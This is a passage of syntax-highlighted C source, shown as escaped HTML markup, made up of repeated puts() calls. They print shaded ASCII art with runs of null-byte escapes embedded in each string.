░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
